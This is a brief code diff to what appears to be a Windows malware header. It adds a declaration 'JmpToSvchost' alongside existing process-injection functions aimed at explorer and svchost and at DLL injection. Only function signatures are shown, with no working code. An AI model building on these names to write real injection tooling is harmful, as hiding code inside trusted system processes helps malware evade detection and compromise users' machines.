@@ -15,6 +15,7 @@ bool InjectIntoExplorer( DWORD (WINAPI f_Main)(LPVOID) );
 bool InjectIntoProcess( DWORD pid, DWORD (WINAPI *func)(LPVOID) );
 bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) );
 bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) );
+bool JmpToSvchost( DWORD (WINAPI f_Main)(LPVOID) );
 bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) );
 
 bool InjectDll( WCHAR *DllPath );
